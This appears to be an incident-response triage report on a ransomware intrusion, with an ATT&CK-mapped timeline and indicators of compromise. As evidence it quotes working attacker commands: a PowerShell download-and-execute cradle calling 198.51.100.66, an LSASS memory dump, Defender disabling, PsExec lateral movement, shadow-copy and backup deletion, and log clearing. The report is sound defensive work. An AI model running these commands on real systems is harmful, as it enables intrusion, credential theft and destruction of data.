# DFIR Triage Findings

## Evidence integrity

| Host | Status |
|---|---|
| WS-0102 | ✅ all SHA-256 hashes verified |
| FS01 | ✅ all SHA-256 hashes verified |

## Kill chain coverage (ATT&CK tactics)

| Tactic | Findings |
|---|---|
| Initial Access | █ 1 |
| Execution | ████ 4 |
| Persistence | ████ 4 |
| Privilege Escalation |  0 |
| Defense Evasion | ████ 4 |
| Credential Access | ██ 2 |
| Discovery | █ 1 |
| Lateral Movement | ███ 3 |
| Command and Control | ██ 2 |
| Impact | █████ 5 |

## Timeline of malicious activity (UTC)

| Time | Host | Tactic | Technique | Sev | Finding | Evidence |
|---|---|---|---|---|---|---|
| 14:25:00 2026-10-27 | WS-0102 | Initial Access | T1553.005 | high | Disk image (ISO/IMG/VHD) written by browser or mail client | `C:\Users\tnguyen\Downloads\Payroll_Nov2026.iso` |
| 14:26:35 2026-10-27 | WS-0102 | Execution | T1218.005 | high | mshta.exe executing HTA / script | `"mshta.exe" "E:\Payroll_Nov2026.hta"` |
| 14:26:41 2026-10-27 | WS-0102 | Execution | T1059.001 | high | Encoded / hidden PowerShell | `powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAG…` <br>**Decoded:** `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a')` |
| 14:26:50 2026-10-27 | WS-0102 | Execution | T1105 | medium | Executable/DLL dropped in user-writable path | `C:\ProgramData\SysUpdate\upd.dll` |
| 14:26:55 2026-10-27 | WS-0102 | Defense Evasion | T1218.011 | high | rundll32 loading a DLL from a user-writable path | `rundll32.exe C:\ProgramData\SysUpdate\upd.dll,Start` |
| 14:26:58 2026-10-27 | WS-0102 | Command and Control | T1071.001 | critical | C2 beaconing every ~60.1s (30 connections, jitter 0.04) | `C:\Windows\System32\rundll32.exe -> 198.51.100.66:443` |
| 14:27:20 2026-10-27 | WS-0102 | Persistence | T1053.005 | high | Scheduled task created (command line) | `schtasks /create /tn "MicrosoftEdgeUpdateTaskCore" /tr "rundll32.exe C:\ProgramData\SysUpdate\upd.dll,Start" /sc onlogon /rl highest` |
| 14:27:21 2026-10-27 | WS-0102 | Persistence | T1053.005 | high | Scheduled task registered (Event 4698) | `rundll32.exe C:\ProgramData\SysUpdate\upd.dll,Start` |
| 14:35:00 2026-10-27 | WS-0102 | Discovery | T1087.002 | medium | Domain / privileged-group discovery commands | `cmd.exe /c whoami /all & net group "domain admins" /domain & nltest /dclist:corp.example` |
| 14:50:00 2026-10-27 | WS-0102 | Credential Access | T1003.001 | critical | LSASS memory dump (comsvcs MiniDump / procdump) | `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\ProgramData\SysUpdate\d.bin full` |
| 14:50:00 2026-10-27 | WS-0102 | Credential Access | T1003.001 | critical | Process opened LSASS with full access (Sysmon 10) | `C:\Windows\System32\lsass.exe` |
| 14:51:40 2026-10-27 | WS-0102 | Defense Evasion | T1562.001 | critical | Microsoft Defender protection disabled | `powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true` |
| 15:25:00 2026-10-27 | WS-0102 | Lateral Movement | T1569.002 | high | PsExec remote execution | `PsExec64.exe \\FS01.corp.example -accepteula -s cmd.exe /c C:\Windows\Temp\lk.exe` |
| 15:25:02 2026-10-27 | FS01 | Lateral Movement | T1021.002 | medium | Network logon (type 3) from a workstation to a server | `EventID 4624` |
| 15:25:03 2026-10-27 | FS01 | Persistence | T1543.003 | medium | New service installed (Event 7045) | `%SystemRoot%\PSEXESVC.exe` |
| 15:25:03 2026-10-27 | FS01 | Lateral Movement | T1569.002 | high | PsExec remote execution | `%SystemRoot%\PSEXESVC.exe` |
| 15:25:04 2026-10-27 | FS01 | Execution | T1569.002 | high | Process executed from Windows\Temp by a service (SYSTEM) | `C:\Windows\Temp\lk.exe --path D:\Shares --ext .lockd` |
| 15:25:06 2026-10-27 | FS01 | Impact | T1490 | critical | Shadow copies / backup catalog deleted, recovery disabled | `vssadmin.exe delete shadows /all /quiet` |
| 15:25:07 2026-10-27 | FS01 | Impact | T1490 | critical | Shadow copies / backup catalog deleted, recovery disabled | `wbadmin delete catalog -quiet` |
| 15:25:08 2026-10-27 | FS01 | Impact | T1490 | critical | Shadow copies / backup catalog deleted, recovery disabled | `bcdedit /set {default} recoveryenabled no` |
| 15:25:10 2026-10-27 | FS01 | Impact | T1486 | critical | Mass encryption: 250 files renamed to *.lockd | `C:\Windows\Temp\lk.exe (2026-10-27T15:25:10.000Z → 2026-10-27T15:29:19.000Z)` |
| 15:30:00 2026-10-27 | FS01 | Impact | T1486 | critical | Ransom note dropped | `D:\Shares\README_RESTORE_FILES.txt` |
| 15:30:50 2026-10-27 | FS01 | Defense Evasion | T1070.001 | critical | Event log cleared | `wevtutil.exe cl Security` |
| 15:30:51 2026-10-27 | FS01 | Defense Evasion | T1070.001 | critical | Event log cleared | `EventID 1102` |
| 20:10:00 2026-10-27 | WS-0102 | Persistence | T1053.005 | high | Live scheduled task runs from user-writable path (\MicrosoftEdgeUpdateTaskCore) | `rundll32.exe C:\ProgramData\SysUpdate\upd.dll,Start` |
| 20:10:00 2026-10-27 | WS-0102 | Command and Control | T1071 | critical | Active connection to internet from suspicious process at collection time | `rundll32.exe C:\ProgramData\SysUpdate\upd.dll,Start -> 198.51.100.66:443` |

## Indicators of compromise

**path**
- `C:\ProgramData\SysUpdate\d.bin`
- `C:\ProgramData\SysUpdate\upd.dll`
- `C:\Users\tnguyen\Downloads\Payroll_Nov2026.iso`
- `C:\Windows\Temp\lk.exe`

**ipv4**
- `198.51.100.66`

**url**
- `http://198.51.100.66/a`

**scheduled_task**
- `\MicrosoftEdgeUpdateTaskCore`

**sha256**
- `065100A9BA3BDBDF9E140BC2EF8569B9545234CC11426EB0274727362E99ABAC  (PsExec64.exe)`
- `A1FED1CAE33CC3F71ED0C834EB91C54E0D6417760C98DC5ED45841AE65E01D30  (lk.exe)`

**service**
- `PSEXESVC`
